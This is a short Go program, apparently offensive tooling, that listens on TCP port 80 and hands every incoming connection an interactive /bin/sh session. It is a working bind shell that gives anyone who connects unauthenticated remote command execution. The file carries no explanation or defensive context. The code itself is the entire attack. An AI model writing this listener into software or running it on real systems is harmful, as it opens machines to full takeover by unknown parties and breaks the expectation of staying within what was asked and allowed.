package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handler(conn net.Conn) {

	cmd := exec.Command("/bin/sh", "-i")

	reader, writer := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = writer
	go io.Copy(conn, reader)
	cmd.Run()
	conn.Close()

}

func main() {

	listener, err := net.Listen("tcp", ":80")
	if err != nil {
		log.Fatalln(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handler(conn)
	}

}
